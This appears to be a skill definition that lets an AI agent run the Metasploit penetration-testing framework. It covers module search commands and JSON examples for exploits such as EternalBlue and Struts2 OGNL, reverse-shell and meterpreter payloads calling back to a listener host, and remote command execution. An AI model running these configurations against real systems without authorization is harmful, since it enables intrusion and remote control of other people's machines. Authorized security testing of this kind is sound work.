---
name: metasploit
description: Penetration testing framework for exploit development and execution. Supports vulnerability scanning, exploitation, and post-exploitation. Use for comprehensive security testing and exploit testing.
metadata: { "runtime": { "emoji": "🔓", "requires": { "bins": ["msfconsole"], "env": [] }, "primaryEnv": null } }
---

# Metasploit

Penetration testing framework for exploit development and execution.

## Usage

Used by the executor with `target` (host or IP) and optional `params.modules`, `params.options`, `params.extra` (msfconsole args), `params.timeout`.

### Important Network Configuration

When targeting Docker containers:
- **Critical**: Metasploit container must connect to the same Docker network as the target container
- **Use container names**: Target containers by their Docker container name instead of IP addresses
- **Automatic LHOST**: Let Metasploit automatically configure LHOST based on container network
- **Network mode**: Use `--network <target_network_name>` when running Metasploit container

Example:
```json
{
  "target": "http://container_name:8080/path",
  "modules": "exploit/multi/http/example_exploit"
}
```

### Session Management

When exploits successfully create sessions:
- **Session detection**: The skill automatically detects and reports session creation in the output
- **Session format**: Sessions appear as `Session X opened (LHOST:LPORT -> RHOST:RPORT)` in results
- **Session lifecycle**: Sessions are created during exploit execution and closed when the exploit completes
- **Session limitations**: The current implementation does NOT support persistent session management or interactive command execution

For persistent sessions and interactive command execution:
- Use Metasploit's native session management features outside of this skill
- Configure longer timeout values to allow session activity before closure
- Consider using Metasploit's post-exploitation modules for extended interaction

## Finding Metasploit Modules

### 1. Search by CVE Number
Search for modules related to a specific CVE:
```bash
msfconsole -q -x "search CVE-2017-5638;exit"
```

### 2. Search by Vulnerability Name
Search for modules by vulnerability name:
```bash
msfconsole -q -x "search struts2;exit"
msfconsole -q -x "search s2-045;exit"
msfconsole -q -x "search type:exploit struts2;exit"
```

### 3. Search by Service/Application
Search for modules targeting specific services:
```bash
msfconsole -q -x "search type:exploit platform:unix http;exit"
msfconsole -q -x "search type:exploit apache struts;exit"
msfconsole -q -x "search type:exploit platform:windows smb;exit"
```

### 4. Search with Filters
Combine multiple search criteria:
```bash
msfconsole -q -x "search type:exploit platform:unix rank:excellent;exit"
msfconsole -q -x "search cve:2017 type:exploit;exit"
```

### 5. Module Naming Convention
Metasploit modules follow this pattern:
- `exploit/<platform>/<service>/<module_name>`
- `auxiliary/<category>/<service>/<module_name>`

Examples:
- `exploit/multi/http/struts2_content_type_ognl` - Struts2 OGNL injection
- `exploit/windows/smb/ms17_010_eternalblue` - EternalBlue SMB exploit
- `auxiliary/scanner/http/wordpress_xmlrpc_login` - WordPress XMLRPC scanner

### 6. Check Module Details
After finding a module, check its required options:
```bash
msfconsole -q -x "use exploit/multi/http/struts2_content_type_ognl;show options;exit"
```

### 7. Test Module First (Non-destructive)
Use check mode to verify vulnerability without exploitation:
```json
{
  "target": "http://target.com:8080",
  "modules": "exploit/multi/http/struts2_content_type_ognl",
  "options": {
    "command": "check"
  }
}
```

### 8. Common Module Patterns
- **Web exploits**: `exploit/multi/http/<vulnerability_name>`
- **SMB exploits**: `exploit/windows/smb/<vulnerability_name>`
- **FTP exploits**: `exploit/unix/ftp/<vulnerability_name>`
- **SSH exploits**: `exploit/unix/ssh/<vulnerability_name>`
- **Local privilege escalation**: `exploit/windows/local/<vulnerability_name>`

### 9. Using the Platform Skill
To search for modules programmatically:
```json
{
  "target": "",
  "modules": "search struts2"
}
```

## Parameters

| Param   | Type   | Required | Description                    |
|---------|--------|----------|--------------------------------|
| target  | string | yes      | Host or IP to scan/exploit (supports HTTP URLs) |
| modules | string/list | no | Metasploit module(s) to run (e.g. "exploit/multi/http/struts2_content_type_ognl") |
| exploit | string | no | Alias for modules parameter |
| options | dict   | no       | Module options (e.g. RHOSTS, RPORT, LHOST, LPORT, PAYLOAD, TARGETURI, CMD). Set "command": "check" to use check mode instead of run |
| extra   | list   | no       | Extra msfconsole CLI arguments |
| timeout | int    | no       | Timeout in seconds (default 300) |
| mode    | string | no       | Execution mode: "shell" (default) or "command" (direct command execution) |

## Examples

### Basic Exploit with Default Payload
Let Metasploit use its default payload configuration:
```json
{
  "target": "http://target-host.com:8080/vulnerable-path",
  "modules": "exploit/multi/http/example_web_exploit",
  "options": {
    "TARGETURI": "/vulnerable-path"
  },
  "timeout": 300
}
```

### Check Mode (Non-destructive)
Verify vulnerability without exploitation:
```json
{
  "target": "http://target-host.com:8080",
  "modules": "exploit/multi/http/example_web_exploit",
  "options": {
    "command": "check"
  },
  "timeout": 60
}
```

### Custom Payload Configuration
Specify custom payload for reverse shell:
```json
{
  "target": "http://target-host.com:8080",
  "modules": "exploit/multi/http/example_web_exploit",
  "options": {
    "PAYLOAD": "cmd/unix/reverse_bash",
    "LHOST": "192.168.1.100",
    "LPORT": 4444
  },
  "timeout": 300
}
```

### Search for Modules
Find modules targeting specific vulnerabilities or services:
```json
{
  "target": "",
  "modules": "search type:exploit apache http",
  "timeout": 30
}
```

### Windows Target with Meterpreter
Windows-specific exploitation with meterpreter payload:
```json
{
  "target": "192.168.1.50",
  "modules": "exploit/windows/smb/example_smb_exploit",
  "options": {
    "RHOSTS": "192.168.1.50",
    "PAYLOAD": "windows/meterpreter/reverse_tcp",
    "LHOST": "192.168.1.100",
    "LPORT": 4444
  },
  "timeout": 300
}
```

### Command Mode (Direct Execution)
Execute specific command on target (if module supports):
```json
{
  "target": "http://target-host.com:8080",
  "modules": "exploit/multi/http/example_web_exploit",
  "mode": "command",
  "options": {
    "CMD": "whoami"
  },
  "timeout": 60
}
```

### Docker Container Target
Target Docker container on same network:
```json
{
  "target": "http://container-name:8080/vulnerable-path",
  "modules": "exploit/multi/http/example_web_exploit",
  "options": {
    "TARGETURI": "/vulnerable-path"
  },
  "timeout": 300
}
```

### Multiple Options Configuration
Comprehensive module configuration:
```json
{
  "target": "https://target-host.com:443",
  "modules": "exploit/multi/http/example_web_exploit",
  "options": {
    "RHOSTS": "target-host.com",
    "RPORT": 443,
    "SSL": true,
    "TARGETURI": "/api/vulnerable-endpoint",
    "PAYLOAD": "linux/x86/meterpreter/reverse_tcp",
    "LHOST": "192.168.1.100",
    "LPORT": 4444,
    "USERNAME": "admin",
    "PASSWORD": "password123"
  },
  "timeout": 600
}
```

## Docker

Image built from `skills/metasploit/Dockerfile`.
